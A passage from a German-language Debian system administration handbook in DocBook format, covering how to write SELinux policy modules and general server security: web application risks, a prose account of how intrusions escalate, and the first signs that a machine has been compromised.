                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOKUMENTATION</emphasis> Erläuterungen zu den <emphasis>Referenzrichtlinien</emphasis></title>

	  <para>Die <emphasis>Referenzrichtlinien</emphasis> entwickeln sich wie jedes freie Softwareprojekt: auf der Grundlage freiwilliger Beiträge. Das Projekt wird von Tresys gehostet, einem der aktivsten Unternehmen im Bereich SELinux. Sein Wiki enthält Erläuterungen darüber, wie die Regeln strukturiert sind, und wie Sie neue erstellen können. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Eine <filename>.te</filename>-Datei schreiben</title>

	<para>Sehen Sie sich  die <filename>beispiel.te</filename>-Datei an:</para>

        <sidebar>
          <title><emphasis>WEITERE SCHRITTE</emphasis> Die Makrosprache <command>m4</command></title>

	  <para>Die SELinux-Entwickler verwendeten einen Makro-Befehlsprozessor, um die Richtlinien ordentlich zu strukturieren. Anstatt viele ähnliche <emphasis>allow</emphasis>-Anweisungen zu duplizieren, haben sie „Makrofunktionen“ erstellt, um eine Logik auf höherer Ebene zu verwenden, die auch zu viel leichter lesbaren Richtlinien führt.</para>

	  <para>Konkret wird <command>m4</command> benutzt, um diese Regeln zu kompilieren. Es führt den umgekehrten Vorgang durch: es erweitert alle diese auf hoher Ebene befindlichen Anweisungen zu einer großen Datenbank von <emphasis>allow</emphasis>-Anweisungen.</para>

	  <para>Die SELinux-„Schnittstellen“ sind lediglich Makrofunktionen, die bei der Kompilierung durch einen Regelsatz ersetzt werden. Desgleichen sind einige Berechtigungen in Wirklichkeit Sätze von Berechtigungen, die bei der Kompilierung durch ihre Werte ersetzt werden.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>Das Modul muss mit seinem Namen und seiner Versionsnummer gekennzeichnet sein. Diese Anweisung ist obligatorisch.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>Falls das Modul neue Typen einführt, muss es sie mit Anweisungen wie dieser festlegen. Zögern Sie nicht, so viele Typen zu erstellen, wie erforderlich sind, anstatt zu viele nutzlose Berechtigungen zu erteilen.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Diese Schnittstellen legen den Typ <literal>myapp_t</literal> als Prozess-Domain fest, die von jeder mit <literal>myapp_exec_t</literal> gekennzeichneten ausführbaren Datei benutzt werden sollte. Dies fügt diesen Objekten stillschweigend auch ein <literal>exec_type</literal>-Attribut hinzu, das seinerseits anderen Modulen ermöglicht, Berechtigungen zur Ausführung dieser Programme zu gewähren: zum Beispiel erlaubt das <literal>userdomain</literal>-Modul Prozessen mit den Domains <literal>user_t</literal>, <literal>staff_t</literal> und <literal>sysadm_t</literal>, sie auszuführen. Die Domains anderer eingeschränkter Anwendungen sind nicht berechtigt, sie auszuführen, es sei denn, die Regeln gewähren ihnen ähnliche Berechtigungen (dies trifft zum Beispiel auf <command>dpkg</command> mit seiner <literal>dpkg_t</literal>-Domain zu).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> ist eine von den Referenzrichtlinien bereitgestellte Schnittstelle. Sie zeigt an, dass mit diesem Typ gekennzeichnete Dateien Protokolldateien sind, die die entsprechenden Regeln wahrnehmen können sollten (zum Beispiel dem Befehl <command>logrotate</command> Berechtigungen erteilen, sodass er sie handhaben kann).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para>Die <literal>allow</literal>-Anweisung ist die grundlegende Anweisung zur Genehmigung eines Vorgangs. Der erste Parameter ist die Prozess-Domain, der es erlaubt ist, den Vorgang auszuführen. Der zweite legt das Objekt fest, das ein Prozess der zuvor genannten Domain handhaben darf. Dieser Parameter hat die Form „<replaceable>type</replaceable>:<replaceable>class</replaceable>“, wobei <replaceable>type</replaceable> sein SELinux-Typ ist und <replaceable>class</replaceable> die Art des Objekts beschreibt (Datei, Verzeichnis, Socket, FIFO usw.). Schließlich beschreibt der letzte Parameter die Berechtigungen (die erlaubten Vorgänge).</para>

	    <para>Berechtigungen sind als Satz erlaubter Vorgänge festgelegt und entsprechen diesem Schema: <literal>{ <replaceable>vorgang1</replaceable> <replaceable>vorgang2</replaceable> }</literal>. Jedoch können Sie auch Makros verwenden, die die nützlichsten Berechtigungen darstellen. Die Datei <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> listet sie auf.</para>

	    <para>Die folgende Website stellt eine recht vollständige Liste von Objektklassen und von Berechtigungen, die gewährt werden können, bereit. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>Jetzt müssen Sie lediglich den kleinsten Regelsatz finden, der erforderlich ist, damit die Anwendung oder der Dienst, auf die er abzielt, ordnungsgemäß funktionieren. Um dies zu erreichen, sollten Sie sich gut damit auskennen, wie die Anwendung funktioniert, und welche Art von Daten sie verarbeitet oder erzeugt.</para>

	<para>Jedoch ist auch eine auf Erfahrung beruhende Vorgehensweise möglich. Nachdem die relevanten Objekte richtig gekennzeichnet sind, können Sie die Anwendung im permissive-Modus benutzen: die Vorgänge, die verboten würden, werden protokolliert, werden aber weiterhin ausgeführt. Durch eine Analyse der Protokolle können Sie nun die Vorgänge identifizieren, die erlaubt werden sollen. Hier ist ein Beispiel eines derartigen Protokolleintrags:</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>Um diese Mitteilung besser verstehen zu können, gehen wir sie Schritt für Schritt durch.</para>

        <table colsep="1">
          <title>Analyse eines SELinux-Ablaufs</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Meldung</entry>
                <entry>Beschreibung</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>Ein Vorgang wurde abgelehnt.</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>Dieser Vorgang erforderte die Berechtigungen <literal>read</literal> und <literal>write</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>Der Prozess mit der PID 1876 hat den Vorgang ausgeführt (oder hat versucht, ihn auszuführen).</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>Der Prozess war eine Ausführung des Programms <literal>syslogd</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead.</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>Das Gerät, auf dem sich das Zielobjekt befindet, ist ein <literal>tmpfs</literal> (ein im Arbeitsspeicher befindliches Dateisystem). Bei einer echten Platte würden Sie die Partition, die das Objekt enthält, sehen (zum Beispiel: „sda3“).</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>Das Objekt ist mit der Inode-Nummer 5510 bezeichnet.</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>Dies ist der Sicherheitskontext des Prozesses, der den Vorgang ausgeführt hat.</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>Dies ist der Sicherheitskontext des Zielobjekts.</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>Das Zielobjekt ist eine FIFO-Datei.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>Durch Betrachtung dieses Protokolleintrags ist es möglich, eine Regel zu erstellen, die diesen Vorgang erlauben würde. Zum Beispiel: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Dieser Prozess kann automatisiert werden, und genau dies bietet der Befehl <command>audit2allow</command> (aus dem Paket <emphasis role="pkg">policycoreutils</emphasis>). Diese Herangehensweise ist nur sinnvoll, wenn die verschiedenen Objekte bereits in Übereinstimmung mit den erforderlichen Einschränkungen richtig gekennzeichnet sind. In jedem Fall müssen Sie die erzeugten Regeln sorgfältig überprüfen und sie auf der Grundlage ihrer Kenntnis der Anwendung bewerten. Faktisch tendiert diese Herangehensweise dazu, mehr Berechtigungen zu erteilen als tatsächlich erforderlich sind. Die richtige Lösung besteht häufig darin, neue Typen zu erstellen und dann nur diesen Typen Berechtigungen zu gewähren. Es kommt auch vor, dass ein verweigerter Vorgang für die Anwendung keine Folgen hat. In diesem Fall kann es besser sein, einfach eine „<literal>dontaudit</literal>“-Regel hinzuzufügen, um einen Protokolleintrag zu vermeiden, obwohl eine Verweigerung stattgefunden hat.</para>

        <sidebar>
          <title><emphasis>ERGÄNZUNGEN</emphasis> Keine Rollen in den Richtlinien</title>
          <indexterm><primary>Type Enforcement</primary></indexterm>
          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>

	  <para>Es mag seltsam erscheinen, dass bei der Erstellung neuer Regeln Rollen überhaupt nicht auftreten. SELinux verwendet nur die Domains um herauszufinden, welche Vorgänge erlaubt sind. Die Rolle kommt nur indirekt zum Tragen, indem sie es dem Benutzer erlaubt, zu einer anderen Domain zu wechseln. SELinux basiert auf einer Theorie, die <emphasis>Type Enforcement</emphasis> heißt, und der Typ ist das einzige Element, das bei der Gewährung von Berechtigungen zählt.</para>
        </sidebar>
      </section>
      <section>
        <title>Die Dateien kompilieren</title>

	<para>Sobald die drei Dateien (<filename>beispiel.if</filename>, <filename>beispiel.fc</filename> und <filename>beispiel.te</filename>) Ihren Erwartungen an die neuen Regeln entsprechen, führen Sie einfach <command>make NAME=devel</command> aus, um in der Datei <filename>beispiel.pp</filename> ein Modul zu erstellen (Sie können es sofort mit <command>semodule -i beispiel.pp</command> laden). Falls mehrere Module festgelegt wurden, wird <command>make</command> alle entsprechenden <filename>.pp</filename>-Dateien erstellen.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Weitere sicherheitsbezogene Überlegungen</title>

    <para>Sicherheit ist nicht nur ein technisches Problem; mehr als alles andere geht es dabei auch um bewährte Verfahrensweisen und um das Verständnis der Risiken. Dieser Abschnitt bespricht einige der häufigeren Risiken, sowie auch einige erprobte Verfahrensweisen, die je nach Sachlage entweder die Sicherheit erhöhen oder die Auswirkung eines erfolgreichen Angriffs verringern sollten.</para>
    <section>
      <title>Inhärente Risiken von Web-Anwendungen</title>

      <para>Der universelle Charakter von Web-Anwendungen hat zu ihrer weiten Verbreitung geführt. Häufig laufen mehrere gleichzeitig: eine Web-Mail, ein Wiki, irgendein Gruppenarbeitssystem, Foren, eine Bildergalerie, ein Blog und so weiter. Viele dieser Anwendungen stützen sich auf den „LAMP“-Stack (<emphasis>Linux, Apache, MySQL, PHP</emphasis>). Leider wurden viele dieser Anwendungen auch ohne große Rücksicht auf Sicherheitsprobleme geschrieben. Von außen kommende Daten werden allzu häufig nach nur geringer ober gar keiner Überprüfung benutzt. Indem speziell hierfür ausgelegte Werte geliefert werden, kann der Aufruf eines Befehls unterlaufen werden, so dass stattdessen ein anderer ausgeführt wird. Viele dieser offensichtlichen Probleme sind im Laufe der Zeit behoben worden, jedoch treten regelmäßig neue Sicherheitsprobleme auf.</para>

      <sidebar>
        <title><emphasis>WÖRTERVERZEICHNIS</emphasis> SQL-Einschleusung</title>

	<para>Wenn ein Programm Daten auf unsichere Weise in SQL-Anfragen einfügt, wird es anfällig für SQL-Einschleusungen; dieser Begriff bezieht sich auf den Austausch eines Parameters in einer Weise, dass die tatsächlich vom Programm ausgeführte Anfrage sich von der beabsichtigten unterscheidet, entweder um die Datenbank zu beschädigen oder um auf Daten zuzugreifen, die normalerweise nicht zugänglich sein sollten. <ulink type="block" url="https://de.wikipedia.org/wiki/SQL-Injection" /></para>
        <indexterm><primary>SQL-Einschleusung</primary></indexterm>
      </sidebar>

      <para>Das regelmäßige Aktualisieren von Web-Anwendungen ist daher ein Muss, damit ein Cracker (ob ein professioneller Angreifer oder ein Skript-Kiddie) eine bekannte Sicherheitslücke nicht ausnutzen kann. Das tatsächliche Risiko hängt vom Einzelfall ab und reicht von der Datenvernichtung bis zur Ausführung beliebigen Codes, einschließlich der Verunstaltung von Websites.</para>
    </section>
    <section>
      <title>Wissen, was zu erwarten ist</title>

      <para>Eine Sicherheitslücke in einer Web-Anwendung wird häufig als Ausgangspunkt für einen Einbruchsversuch benutzt. Im Folgenden werden die möglichen Konsequenzen kurz dargestellt.</para>

      <sidebar>
        <title><emphasis>KURZER BLICK</emphasis> HTTP-Anfragen filtern</title>

	<para>Apache 2 enthält Module, die das Filtern ankommender HTTP-Anfragen ermöglichen. Hierdurch können einige Angriffsvektoren gestoppt werden. Zum Beispiel können Pufferüberläufe durch die Begrenzung der Parameterlänge verhindert werden. Allgemeiner ausgedrückt, kann man Parameter überprüfen, schon bevor sie an die Web-Anwendung weitergeleitet werden, und den Zugang aufgrund zahlreicher Kriterien einschränken. Dies kann sogar mit dynamischen Firewall-Aktualisierungen kombiniert werden, so dass ein Client, der eine der Regeln verletzt, für eine bestimmte Zeit vom Zugang zum Web-Server ausgeschlossen wird.</para>

	<para>Das Einrichten dieser Überprüfungen kann eine lange und mühsame Aufgabe sein, sie kann sich aber auszahlen, wenn die Web-Anwendung, die eingesetzt werden soll, in Sicherheitsfragen eine zweifelhafte Erfolgsbilanz hat.</para>

	<para><emphasis>mod-security2</emphasis> (in the <emphasis role="pkg">libapache2-mod-security2</emphasis> package) is the main
        such module. It even comes with many ready-to-use rules of its own
        (in the <emphasis role="pkg">modsecurity-crs</emphasis> package)
        that you can easily enable.</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>Die Folgen eines Einbruchs sind unterschiedlich deutlich in Abhängigkeit von den Motiven des Angreifers. <emphasis>Skript-Kiddies</emphasis> wenden lediglich Rezepte an, die sie auf Websites finden; meistens verunstalten sie eine Webseite oder löschen Daten. In subtileren Fällen fügen sie den Webseiten unsichtbare Inhalte hinzu, um so in Suchmaschinen die Verweise auf ihre eigenen Seiten zu verbessern.</para>

      <para>Ein weiter fortgeschrittener Angreifer wird darüber hinausgehen. Ein Katastrophenszenario könnte folgendermaßen aussehen: der Angreifer erlangt die Fähigkeit, als Benutzer <literal>www-data</literal>-Befehle auszuführen. Jedoch erfordert die Ausführung eines Befehls zahlreiche Manipulationen. Um sich sein Leben leichter zu machen, installiert er andere Web-Anwendungen, die speziell dafür entworfen wurden, aus der Ferne zahlreiche Arten von Befehlen auszuführen, wie z.B. das Durchsuchen des Dateisystems, das Begutachten von Berechtigungen, das Hoch- oder Herunterladen von Dateien, die Ausführung von Befehlen und sogar das Bereitstellen einer Netzwerkkonsole. Häufig ermöglicht es eine Sicherheitslücke, einen <command>wget</command>-Befehl auszuführen, mit dem Schadsoftware in das Verzeichnis <filename>/tmp/</filename> heruntergeladen wird, um sie dann auszuführen. Die Schadsoftware wird häufig von einer fremden Website heruntergeladen, die zuvor kompromittiert wurde, um so Spuren zu verwischen und das Finden des Ursprungs des Angriffs zu erschweren.</para>

      <para>An diesem Punkt verfügt der Angreifer über ausreichende Bewegungsfreiheit, um einen IRC-<emphasis>bot</emphasis> zu installieren (einen Roboter, der sich mit einem IRC-Server verbindet und über diesen Kanal gesteuert werden kann). Dieser Bot wird häufig dazu verwendet, illegale Dateien zu tauschen (nicht autorisierte Kopien von Filmen oder Software und so weiter). Ein entschlossener Angreifer könnte sogar noch weitergehen wollen. Das Konto <literal>www-data</literal> erlaubt keinen vollständigen Zugang zum Rechner, und der Angreifer wird versuchen, Administratorrechte zu erlangen. Nun sollte dies nicht möglich sein, aber wenn die Web-Anwendung nicht aktuell war, besteht das Risiko, dass der Kernel und weitere Programme ebenfalls veraltet sind; dies ergibt sich manchmal aus einer Entscheidung des Administrators, der, obwohl er die Sicherheitslücke kennt, es versäumt hat, das System zu aktualisieren, da es keine lokalen Benutzer gibt. Der Angreifer kann dann diese zweite Sicherheitslücke ausnutzen, um Root-Zugang zu erlangen.</para>

      <sidebar>
        <title><emphasis>WÖRTERVERZEICHNIS</emphasis> Rechteausweitung</title>

	<para>Dieser Begriff umfasst alles, was dazu verwendet werden kann, höhere Berechtigungen zu erlangen, als ein bestimmter Benutzer normalerweise haben sollte. Das <command>sudo</command>-Programm dient genau dem Zweck, einigen Benutzern administrative Rechte zu geben. Derselbe Begriff wird aber auch verwendet, um die Tat eines Angreifers zu beschreiben, der eine Sicherheitslücke ausnutzt, um unangemessene Rechte zu erlangen.</para>
      </sidebar>

      <para>Jetzt ist der Angreifer im Besitz des Rechners; er wird gewöhnlich versuchen, diesen privilegierten Zugang möglichst lange zu erhalten. Hierzu ist die Installation eines <emphasis>Rootkits</emphasis> erforderlich, eines Programms, dass einige Komponenten des Systems ersetzt, so dass der Angreifer in der Lage ist, zu einem späteren Zeitpunkt erneut die Privilegien des Administrators zu erlangen; das Rootkit versucht außerdem, sein Vorhandensein zu verbergen, wie auch alle Spuren des Einbruchs. Ein unterwandertes <command>ps</command>-Programm wird dann einige Prozesse nicht auflisten, <command>netstat</command> wird einige der aktiven Verbindungen nicht aufführen und so weiter. Durch Verwendung der Root-Berechtigungen war der Angreifer in der Lage, das ganze System zu beobachten, hat aber keine wichtigen Daten gefunden; daher wird er versuchen, auf andere Rechner des Firmennetzwerks zuzugreifen. Durch die Analyse des Administratorkontos und der Verlaufsdateien findet der Angreifer heraus, auf welche Rechner üblicherweise zugegriffen wird. Indem der Angreifer <command>sudo</command> oder <command>ssh</command> durch ein verfälschtes Programm ersetzt, kann er einige Passwörter des Administrators abfangen, die er bei den entdeckten Servern anwenden wird... und der Einbruch kann sich von hier aus weiterverbreiten.</para>

      <para>Dies ist ein Albtraumszenarium, das durch eine Reihe von Maßnahmen verhindert werden kann. Die nächsten Abschnitte beschreiben einige von ihnen.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Die Software wohlüberlegt auswählen</title>

      <para>Sobald die möglichen Sicherheitsprobleme bekannt sind, muss ihnen bei jedem Schritt des Bereitstellungsprozesses eines Dienstes Rechnung getragen werden, insbesondere bei der Auswahl der zu installierenden Software. Viele Websites, wie zum Beispiel <literal>SecurityFocus.com</literal>, unterhalten eine Liste kürzlich entdeckter Sicherheitslücken, die ein Bild einer Sicherheitsbilanz vermitteln können, bevor eine bestimmte Software eingesetzt wird. Natürlich muss diese Information der Popularität der besagten Software gegenübergestellt werden: ein weiter verbreitetes Programm ist ein verlockenderes Ziel und wird folglich eingehender erforscht. Andererseits kann ein Nischenprogramm voller Sicherheitslücken sein, die aufgrund mangelnden Interesses an einem Sicherheitsaudit niemals veröffentlicht werden.</para>

      <sidebar>
        <title><emphasis>WÖRTERVERZEICHNIS</emphasis> Sicherheitsaudit</title>

	<para>Ein Sicherheitsaudit ist der Prozess, bei dem der Quellcode einer Software gründlich gelesen und analysiert wird, wobei nach möglichen Sicherheitslücken Ausschau gehalten wird, die er enthalten könnte. Derartige Audits sind gewöhnlich proaktiv und werden durchgeführt, um zu gewährleisten, dass ein Programm gewisse Sicherheitserfordernisse erfüllt.</para>
      </sidebar>

      <para>In der Welt der freien Software besteht im allgemeinen große Wahlfreiheit, und eine Software einer anderen vorzuziehen, sollte eine Entscheidung sein, die auf örtlich gültigen Kriterien beruht. Eine höhere Anzahl von Leistungsmerkmalen bringt auch ein erhöhtes Risiko einer Sicherheitslücke mit sich, die im Code verborgen sein könnte; es kann auch kontraproduktiv sein, das höchst entwickelte Programm zu wählen, und ein besserer Ansatz besteht gewöhnlich darin, das einfachste Programm, das die Erfordernisse erfüllt, auszuwählen.</para>

      <sidebar>
        <title><emphasis>WÖRTERVERZEICHNIS</emphasis> Zero-Day-Exploit</title>

	<para>Eine <emphasis>Zero-Day</emphasis>-Attacke ist kaum zu verhindern; der Begriff beschreibt eine Sicherheitslücke, die den Autoren des Programms noch nicht bekannt ist.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Einen Rechner als Ganzes verwalten</title>

      <para>Die meisten Linux-Distributionen installieren standardmäßig eine Reihe von Unix-Diensten und zahlreiche Hilfsprogramme. In vielen Fällen werden diese Dienste und Programme für den eigentlichen Zweck, zu dem der Administrator den Rechner eingerichtet hat, nicht benötigt. Als allgemeine Richtlinie für Sicherheitsfragen gilt, dass nicht benötigte Software möglichst deinstalliert werden sollte. In der Tat macht es keinen Sinn, einen FTP-Server abzusichern, wenn in einem anderen, nicht benutzten Dienst eine Sicherheitslücke dazu ausgenutzt werden kann, Administratorrechte für den ganzen Rechner zu erlangen.</para>

      <para>Aus demselben Grund werden Firewalls häufig so konfiguriert, dass sie Zugang nur zu solchen Diensten ermöglichen, die öffentlich zugänglich sein sollen.</para>

      <para>Heutige Rechner sind ausreichend leistungsfähig, um mehrere Dienste auf demselben physischen Gerät unterzubringen. Aus ökonomischer Sicht ist eine solche Möglichkeit interessant: nur einen Rechner verwalten, geringerer Energieverbrauch und so weiter. Unter Sicherheitsaspekten kann diese Entscheidung jedoch problematisch sein. Ein einziger kompromittierter Dienst kann Zugang zum ganzen Rechner zur Folge haben, wodurch wiederum die anderen Dienste, die auf demselben Rechner untergebracht sind, gefährdet werden. Diesem Risiko kann entgegengewirkt werden, indem man die Dienste voneinander isoliert. Dies kann entweder durch Virtualisierung erreicht werden (jeder Service wird in einer eigenen virtuellen Maschine oder einem Container betrieben) oder durch AppArmor/SELinux (jeder Dienste-Daemon hat einen passend gestalteten Satz an Berechtigungen).</para>
    </section>
    <section id="sect.users-are-players">
      <title>Benutzer sind Spieler</title>

      <para>Spricht man über Sicherheit, so denkt man sogleich an den Schutz vor Angriffen durch anonyme Cracker, die sich irgendwo im Internetdschungel verbergen; eine häufig vergessene Tatsache ist jedoch, dass Risiken auch von innen entstehen können: ein Angestellter, der im Begriff ist, die Firma zu verlassen, könnte sensible Dateien aus wichtigen Projekten herunterladen und an Wettbewerber verkaufen, ein nachlässiger Verkäufer könnte während eines Treffens mit einem potentiellen Neukunden seinen Schreibtisch verlassen, ohne seine Sitzung zu sperren, ein ungeschickter Benutzer könnte versehentlich das falsche Verzeichnis löschen und so weiter.</para>

      <para>Die Reaktion auf diese Risiken kann technische Lösungen umfassen: nur die tatsächlich erforderlichen Berechtigungen sollten den Benutzern gewährt werden, und regelmäßige Sicherungskopien sind unabdingbar. In vielen Fällen wird der angemessene Schutz jedoch auch mit einer Unterweisung der Benutzer in der Vermeidung von Risiken verbunden sein.</para>

      <sidebar>
        <title><emphasis>KURZER BLICK</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>Das Paket <emphasis role="pkg">autolog</emphasis> stellt ein Programm bereit, das nach einer einstellbaren Zeitspanne untätige Benutzer selbstständig abschaltet. Es ermöglicht es auch, Benutzerprozesse abzustellen, die nach dem Ende einer Sitzung bestehen bleiben, um so Benutzer daran zu hindern, Daemons zu betreiben.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Physische Sicherheit</title>

      <para>Es macht keinen Sinn, die Dienste und Netzwerke abzusichern, wenn die Rechner selbst nicht geschützt sind. Es gehört sich, dass wichtige Daten auf im laufenden Betrieb austauschbaren Platten in einem RAID-System gespeichert sind, da Festplatten irgendwann ausfallen und die Datenverfügbarkeit unabdingbar ist. Aber wenn jeder Pizzalieferant das Gebäude betreten, in den Serverraum schleichen und mit einigen ausgewählten Festplatten davonlaufen kann, ist ein wichtiger Teilbereich der Sicherheit nicht gegeben. Wer kann den Serverraum betreten? Wird der Zugang überwacht? Diese Fragen verdienen Beachtung (und eine Antwort), wenn die physische Sicherheit beurteilt wird.</para>

      <para>Zur physischen Sicherheit gehört auch, dass Unfallrisiken wie Brände bedacht werden. Wegen dieses besonderen Risikos ist es gerechtfertigt, die Sicherungsmedien in einem separaten Gebäude zu lagern, oder wenigstens in einem feuersicheren Stahlschrank.</para>
    </section>
    <section>
      <title>Rechtliche Haftung</title>

      <para>Einem Administrator vertrauen seine Nutzer mehr oder weniger vorbehaltlos, genauso wie die Nutzer des Netzwerks im Allgemeinen. Er sollte deshalb jede Nachlässigkeit vermeiden, die von böswilligen Menschen ausgenutzt werden könnte.</para>

      <para>Ein Angreifer, der die Kontrolle über Ihren Rechner übernimmt und ihn dann als vorgeschobene Basis („Relais-System“ genannt) benutzt, um von ihm weitere ruchlose Aktivitäten auszuführen, könnte Ihnen gesetzliche Unannehmlichkeiten verursachen, da die angegriffene Seite den Angriff zunächst als von Ihrem System ausgehend sieht, und daher Sie als Angreifer (oder als Komplizen) betrachten wird. In vielen Fällen wird der Angreifer Ihren Server als Relais zur Versendung von Spam benutzen, was keine großen Auswirkungen haben sollte (außer möglicherweise die Registrierung in schwarzen Listen, die Ihre Fähigkeit, legitime E-Mails zu versenden, beschränken könnte), aber dennoch unangenehm wäre. In anderen Fällen können durch Ihren Rechner bedeutendere Störungen verursacht werden, wie zum Beispiel Denial-of-Service-Angriffe. Dies wird manchmal zu Einnahmeverlusten führen, da die berechtigten Dienste nicht verfügbar sein und Daten zerstört werden können; manchmal wird dies auch tatsächliche Kosten verursachen, da die angegriffene Seite rechtliche Schritte gegen Sie einleiten kann. Rechteinhaber können Sie verklagen, wenn eine nicht autorisierte Kopie eines urheberrechtlich geschützten Werkes von Ihrem Server weitergegeben wird, wie auch andere Unternehmen, falls sie aufgrund von Dienstgütevereinbarungen zu Strafzahlungen infolge des Angriffs durch Ihren Rechner verpflichtet sind.</para>

      <para>Wenn dies geschieht, genügt es nicht gewöhnlich nicht, seine Unschuld zu beteuern; Sie werden zumindest überzeugende Beweise benötigen, die von einer bestimmten IP-Adresse ausgehende verdächtige Aktivitäten auf Ihrem Rechner zeigen. Dies wird nicht möglich sein, wenn Sie die Empfehlungen dieses Kapitels vernachlässigen und zulassen, dass der Angreifer Zugang zu einem privilegierten Konto (insbesondere Root) erlangt und dies dann dazu benutzt, seine Spuren zu verwischen.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>Umgang mit einem kompromittierten Rechner</title>

    <para>Trotz bester Absichten und aller Sorgfalt bei der Erstellung der Sicherheitsregeln wird ein Administrator eines Tages einer feindlichen Übernahme gegenüberstehen. Dieser Abschnitt stellt einige Leitlinien darüber bereit, wie man im Falle dieser unglücklichen Umstände reagieren sollte.</para>
    <section>
      <title>Den Einbruch eines Crackers entdecken und sehen</title>

      <para>Der erste Schritt einer Reaktion auf einen Einbruch besteht darin, eine derartige Tat überhaupt wahrzunehmen. Dies ist nicht selbstverständlich, vor allem nicht ohne eine angemessene Überwachungsinfrastruktur.</para>

      <para>Einbrüche bleiben häufig unentdeckt, bis sie direkte Folgen für die legitimen Dienste haben, die auf dem Rechner untergebracht sind, wie zum Beispiel, dass Verbindungen langsamer werden, dass einige Benutzer sich nicht anmelden können, oder eine andere Fehlfunktion. Angesichts dieser Probleme muss sich der Administrator den Rechner genau ansehen und sorgfältig alles überprüfen, was nicht normal funktioniert. Dann entdeckt er normalerweise einen ungewöhnlichen Prozess, zum Beispiel einen namens <literal>apache</literal> statt des standardmäßigen <literal>/usr/sbin/apache2</literal>. Wenn wir diesem Beispiel weiter folgen, so sollte seine Prozesskennung notiert und mit <filename>/proc/<replaceable>pid</replaceable>/exe</filename> überprüft werden, um zu sehen, welches Programm diesen Prozess zur Zeit gerade ausführt:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>Ein unter <filename>/var/tmp/</filename> installiertes Programm, das als Webserver läuft? Kein Zweifel, der Rechner ist kompromittiert.</para>

      <para>Dies ist nur ein Beispiel, aber auch zahlreiche andere Hinweise können den Administrator alarmieren:</para>
      <itemizedlist>
        <listitem>
	  <para>eine Option eines Befehls, die nicht mehr funktioniert; die Version des Programms, in der der Befehl angeblich vorliegt, stimmt nicht mit der Version überein, die laut <command>dpkg</command> installiert sein sollte;</para>
        </listitem>
        <listitem>
	  <para>eine Eingabeaufforderung oder ein Begrüßungsbildschirm, die anzeigen, dass die vorherige Verbindung von einem unbekannten Server oder einem anderen Kontinent kam;</para>
        </listitem>
        <listitem>
	  <para>Fehler, die darauf zurückzuführen sind, dass die Partition <filename>/tmp/</filename> voll ist, wobei sich dann herausstellt, dass sie voller illegaler Filmkopien ist;</para>
        </listitem>
        <listitem>
	  <para>und so weiter.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Den Server vom Netz nehmen</title>

